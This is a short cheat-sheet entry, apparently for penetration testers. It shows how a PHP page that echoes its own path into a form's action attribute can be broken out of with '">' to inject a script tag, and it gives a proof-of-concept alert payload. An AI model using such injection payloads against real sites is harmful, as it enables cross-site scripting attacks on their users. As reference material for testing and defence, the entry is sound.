# Self-XSS

Context URL:

```
https://example.com/example/page.php?search=...
```

Example source code of this page:

```html
<div class="form-search">
  <form action="/example/page.php" method="GET">
  <div class="form-box">
  <h1>Title</h1>
    ....
</div>
```

**To see if the application is vulnerable, try:**

```
https://example.com/example/page.php/
```

If the source code change to:

```html
<div class="form-search">
  <form action="/example/page.php/" method="GET">
  ...
</div>
```

Try to exploit with:

```html
https://example.com/example/page.php/"><script>alert("hacked")</script>
```

Note: `/">` To finalize the action tag and put the script tag
